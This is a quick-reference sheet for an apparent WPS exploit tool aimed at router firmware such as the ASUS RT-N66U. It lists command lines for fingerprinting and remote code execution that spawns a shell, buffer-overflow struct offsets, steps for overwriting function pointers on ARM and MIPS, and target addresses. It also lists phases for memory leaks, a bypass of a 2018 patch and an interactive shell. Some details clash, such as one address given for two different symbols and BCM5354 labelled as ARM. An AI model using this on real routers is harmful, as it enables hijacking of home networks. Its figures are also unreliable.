# WPSplinter Quick Reference

## Quick Start

```bash
# 1. Fingerprint target
python3 wpslinter.py --iface wlan0 --bssid AA:BB:CC:DD:EE:FF --ssid "Network" --phase fingerprint

# 2. If vulnerable, exploit (ARM)
python3 wpslinter.py --iface wlan0 --bssid AA:BB:CC:DD:EE:FF --ssid "Network" \
    --phase exploit_arm --arch arm --system_plt 0x27683 --cmd "/bin/sh -i"
```

## State Struct Layout (EAP_WPS_AP_STATE)

| Offset | Field              | Size | Purpose                    |
|--------|-------------------|------|----------------------------|
| +0     | frags_received[]  | 2048 | WPS data buffer            |
| +2048  | total_bytes_to_recv| 4   | Attacker-controlled (LF)   |
| +2052  | total_received    | 4   | Write cursor               |
| +2056  | next_frag_to_send | 4   | Read primitive (leak)      |
| +2060  | frag_size         | 4   | Leak length control        |
| +2076  | flags             | 4   | State flags                |
| +2080  | last_sent         | 4   | Pointer (MIPS exploit)     |
| +2084  | last_sent_len     | 4   | Length                     |
| +2108  | send_data         | 4   | Function pointer (ARM)     |

## WPS Constants

| Constant              | Value  | Description              |
|----------------------|--------|--------------------------|
| EAPOL_HEADER_LEN     | 26     | EAPOL header size        |
| SZ_HDR               | 14     | WpsEapHdr size           |
| FRAGS_CAP            | 2048   | frags_received buffer    |
| WPS_DATA_OFFSET      | 32     | EAPOL + WpsEapHdr        |
| WPS_MSGTYPE_OFFSET   | 9      | Message Type TLV offset  |
| EAP_TYPE_WPS         | 254    | EAP expanded type        |
| WPS_TLV_MSGTYPE      | 0x1022 | Message Type attribute   |

## Exploit Mechanics

### ARM (send_data overwrite)
1. Overflow frags_received[2048] with payload
2. Overwrite send_data function pointer with system@PLT
3. Command in MAC prefix: [our_MAC][AP_MAC][padding][cmd;#]
4. FRAG-ACK triggers send_data() -> system(cmd)

### MIPS (last_sent overwrite)
1. Stage command string in overflow region
2. Overwrite last_sent pointer to point at command
3. Wait 5 seconds for timer
4. ap_eap_sm_resend_last_sent() calls send_data(last_sent)

## Finding Addresses (on router)

```bash
# ARM: Find system@PLT
nm /usr/sbin/wps-monitor | grep system

# MIPS: Find printf GOT entry
nm /usr/sbin/wps-monitor | grep printf

# Calculate libc base
cat /proc/self/maps | grep libc
```

## Typical Addresses (ASUS RT-N66U Merlin)

| Symbol          | ARM (BCM5354) | MIPS (RT2880) |
|----------------|---------------|---------------|
| system@plt     | 0x27683       | -             |
| printf@got     | -             | 0x27683       |
| libc printf    | -             | +0x551d0      |
| libc system    | -             | +0x14390      |

## Phases

| Phase         | Purpose                              |
|--------------|--------------------------------------|
| fingerprint  | Detect vulnerability                 |
| calibrate    | Measure FRAG-ACK timing              |
| leak         | Read process memory                  |
| exploit_arm  | ARM RCE via send_data                |
| exploit_mips | MIPS RCE via last_sent               |
| bypass       | Bypass 2018 patch                    |
| shell        | Interactive shell                    |
| verify       | Verify exploit success               |
